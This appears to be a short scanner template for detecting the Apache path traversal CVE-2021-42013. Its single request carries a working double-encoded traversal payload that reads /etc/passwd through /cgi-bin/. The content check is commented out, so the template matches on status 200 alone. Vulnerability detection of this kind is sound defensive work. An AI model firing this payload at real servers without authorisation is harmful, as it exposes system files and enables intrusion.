id: CVE-2021-42013

info:
  name: Apache path traversal detection
  author: "EBB"

requests:
  - method: GET
    path: 
      - "{{BaseURL}}/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      #- type: regex
      #  part: body
      #  regex:
      #    - ".+:x:[0-9]+:[0-9]+:.+:.+"
